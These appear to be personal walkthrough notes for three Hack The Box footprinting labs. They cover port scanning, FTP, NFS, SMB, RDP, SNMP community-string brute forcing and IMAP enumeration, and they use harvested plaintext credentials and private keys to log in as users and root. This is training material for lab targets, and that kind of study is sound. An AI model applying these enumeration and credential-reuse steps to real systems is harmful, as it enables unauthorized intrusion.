
Easy lab
- nmap -p- T4 --min-rate=1000 IP
	- 21/tcp open ftp
	- 22/tcp open ssh
		- OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
	- 53/tcp open domain
		- ISC BIND 9.16.1 (Ubuntu Linux)
	- 2121/tcp open ccproxy-ftp
- 21 ftp
	- ceil:qwer1234 works
		- Nothing listed
- 2121 ftp
	- ceil:qwer1234 works
		- ls -> nothing
		- but ls -al shows more!
			- .ssh directory
		- get id_rsa
		- get id_rsa.pub
		- get authorized_keys
- 22 open ssh
	- ssh -v ceil@10.129.64.132
		- public key only, password don't work
	- can login as ceil with the id_rsa file we downloaded from ftp
		- ssh ceil@10.129.64.132 -i id_rsa
	- then cat the flag


Medium lab
- nmap scan
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


After running with -sV

111, 2049 -> NFS
135,445 -> SMB
3389 -> windows RDP
the rest -> microsoft remote management

enumerate NFS
- showmount -e 10.129.198.248
	- /TechSupport
- mount the share
	- mkdir target-NFS
	- sudo mount -t nfs 10.129.198.248:/ ./target-NFS/ -o nolock
		- no permission
		- nevermind. actually just needed to run as root
	- cat *
	- found credentials for smtp server?

 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17    	withUserNameSupport=false
18    	sendWelcomeEmail=true
19    	enableGravatarSupport=true
20    	signupSkipLogin=true
21    	tokenDuration=60
22    	tokenDeleteInterval=5
23    	minimumPasswordLength=8
24    	enableTokenJob=true
25    	hasher=bcrypt
26	}
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   



enumerate SMB
- smbclient -L //10.129.205.58 HTB 
	- No password
- ./enum4linux-ng.py
	- Domain: WINMEDIUM
- Connect with credentials
	- smbclient -L //10.129.205.58 -U alex
	- password: lol123!mD

ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	devshare        Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      

SMB continued
- Tried to connect to the share
	- smbclient //10.129.205.58/devshare -U alex
	- see important.txt
- Fail to get
	- reason: was still in the mounted directory on local machine. cd to desktop and can get already
	- sa:87N1ns@slls83

enumerate RDP with credentials
- xfreerdp /u:sa /p:"87N1ns@slls83" /v:10.129.205.58
	- doesnt work
- xfreerdp /u:alex /p:'lol123!mD' /v:10.129.205.58
	- Had to use ' ' and not " " for some reason.
	- some gui problem with root, ran as normal user and worked
- Then log into the mssql server with the found credentials from just now
	- Run the application as admin then type password
- Editing the table shows the users


hard lab

nmap scan

22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

Don't forget to check UDP!
161/udp open snmp

Enumerate snmp
- Try to bruteforce community string
	- onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
- Found string: backup
- Enumerate with found cred
	- snmpwalk -v2c -c backup 10.129.202.20
- Found creds
	- tom NMds732Js2761
- Successfully logged into imap with this
	- `openssl s_client -connect <target>:993` (can replace 993 with imaps)
	- a login tom NMds...
	- `a list "" "*"`
	- a select Important
		- nothing inside
	- a select INBOX
		- found an ssh private key inside
- Then copy the private key over to local machine, then use it to log in to ssh root
	- cat the database and find htb flag
- If login as tom instead,
	- need to access the mysql client
	- mysql --user=tom -p
	- SHOW DATABASES;
	- USE users;

https://manojghimire.com.np/footprinting-lab-hard-hack-the-box/?i=1

